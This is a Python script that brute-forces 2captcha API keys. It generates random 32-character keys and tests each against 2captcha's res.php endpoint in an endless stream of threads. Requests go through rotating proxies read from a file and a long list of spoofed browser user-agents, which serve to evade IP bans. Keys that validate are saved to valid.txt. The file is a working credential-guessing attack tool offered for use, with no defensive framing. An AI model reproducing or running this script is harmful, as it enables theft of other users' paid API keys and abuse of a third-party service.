import httpx, random, string, time, threading, ctypes, os, sys

counter = [0,0,0,0,0]
proxfile1 = 'http.txt'
uas=['Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 '
 'Firefox/100.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/98.0.1108.62',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/99.0.4844.51 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/99.0.4844.51 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/99.0.4844.51 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 '
 'Firefox/97.0',
 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/99.0.4844.51 Safari/537.36 Vivaldi/4.3',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/99.0.4844.51 Safari/537.36 Vivaldi/4.3',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/99.0.4844.51 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/99.0.4844.51 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/99.0.4844.51 Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, '
 'like Gecko) Chrome/99.0.4844.51 Safari/537.36',
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/99.0.4844.51 Safari/537.36',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 '
 '(KHTML, like Gecko) CriOS/99.0.4844.47 Mobile/15E148 Safari/604.1',
 'Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, '
 'like Gecko) CriOS/99.0.4844.47 Mobile/15E148 Safari/604.1',
 'Mozilla/5.0 (iPod; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 '
 '(KHTML, like Gecko) CriOS/99.0.4844.47 Mobile/15E148 Safari/604.1',
 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/99.0.4844.48 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/99.0.4844.48 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/99.0.4844.48 Mobile Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 '
 'Firefox/97.0',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 '
 'Firefox/97.0',
 'Mozilla/5.0 (X11; Linux i686; rv:97.0) Gecko/20100101 Firefox/97.0',
 'Mozilla/5.0 (Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0',
 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:97.0) Gecko/20100101 Firefox/97.0',
 'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2_1 like Mac OS X) '
 'AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/97.0 Mobile/15E148 '
 'Safari/605.1.15',
 'Mozilla/5.0 (iPad; CPU OS 12_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, '
 'like Gecko) FxiOS/97.0 Mobile/15E148 Safari/605.1.15',
 'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/97.0',
 'Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:97.0) Gecko/97.0 Firefox/97.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 '
 'Firefox/91.0',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:91.0) Gecko/20100101 '
 'Firefox/91.0',
 'Mozilla/5.0 (X11; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, '
 'like Gecko) Version/15.2 Safari/605.1.15',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) '
 'AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 '
 'Safari/604.1',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/98.0.1108.62',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, '
 'like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/97.0.1072.69',
 'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/99.0.4844.48 Mobile Safari/537.36 EdgA/97.0.1072.69',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) '
 'AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 EdgiOS/97.1072.69 '
 'Mobile/15E148 Safari/605.1.15',
 'Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) '
 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Mobile '
 'Safari/537.36 Edge/40.15254.603',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, '
 'like Gecko) Chrome/99.0.4844.51 Safari/537.36 OPR/84.0.4316.21',
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/99.0.4844.51 Safari/537.36 OPR/84.0.4316.21',
 'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/99.0.4844.48 Mobile Safari/537.36 OPR/63.3.3216.58675',
 'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/99.0.4844.48 Mobile Safari/537.36 OPR/63.3.3216.58675',
 'Mozilla/5.0 (Linux; arm_64; Android 12; SM-G965F) AppleWebKit/537.36 (KHTML, '
 'like Gecko) Chrome/99.0.4844.48 YaBrowser/21.3.4.59 Mobile Safari/537.36',
 'Mozilla/5.0 (X11; CrOS x86_64 14388.61.0) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/98.0.4758.107 Safari/537.36',
 'Mozilla/5.0 (X11; CrOS x86_64 14388.61.0) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/98.0.4758.107 Safari/537.36',
 'Mozilla/5.0 (X11; CrOS armv7l 14388.61.0) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/98.0.4758.107 Safari/537.36',
 'Mozilla/5.0 (X11; CrOS aarch64 14388.61.0) AppleWebKit/537.36 (KHTML, like '
 'Gecko) Chrome/98.0.4758.107 Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, '
 'like Gecko) Version/15.2 Safari/605.1.15',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 '
 'Firefox/97.0',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, '
 'like Gecko) Chrome/99.0.4844.51 Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, '
 'like Gecko) Chrome/99.0.4844.51 Safari/537.36 Vivaldi/4.3',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, '
 'like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/97.0.1072.69',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) '
 'AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 '
 'Safari/604.1',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) '
 'AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.47 Mobile/15E148 '
 'Safari/604.1',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) '
 'AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/97.0 Mobile/15E148 '
 'Safari/605.1.15',
 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/99.0.4844.48 Mobile Safari/537.36',
 'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/97.0']

counter = 0
def gen(length):
    letters_and_digits = string.ascii_letters + string.digits
    result_str = ''.join((random.choice(letters_and_digits) for i in range(length)))
    return result_str
def check():
  key = gen(32)
  url = f'http://2captcha.com/res.php?key={key}&action=get&id=2122988149'
  try:
    with httpx.Client(http2=True,proxies='http://'+random.choice(list(map(lambda x:x.strip(),open(proxfile1)))),headers = {'accept-language': 'en','user-agent':random.choice(uas)},follow_redirects=True) as client:
      r = client.get(url)
      if "ERROR_KEY_DOES_NOT_EXIST" in r.text:
        print(f'invalid : {key}',"ERROR_KEY_DOES_NOT_EXIST")
      elif "IP_BANNED" in r.text:
        print(f'invalid : {key}',"IP_BANNED")
      elif "price" in r.text:
        print(f'valid : {key}', r.text)
        f = open('valid.txt','a+')
        f.write(f'{key}\n')
      else:
        pass
  except:
    pass
if __name__ == "__main__":
  Threads = []
  while 1:
    t = threading.Thread(target=check)
    t.start()
    Threads.append(t)
  for i in Threads:
    i.join()
print('Done')
time.sleep(5)
input('enter to exit')





  
